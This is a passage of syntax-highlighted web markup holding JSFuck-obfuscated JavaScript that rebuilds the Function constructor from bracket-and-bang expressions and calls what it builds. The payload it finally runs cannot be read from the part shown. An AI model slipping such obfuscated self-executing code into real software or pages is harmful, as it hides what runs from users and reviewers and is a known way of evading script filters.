class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>((!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>((!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span 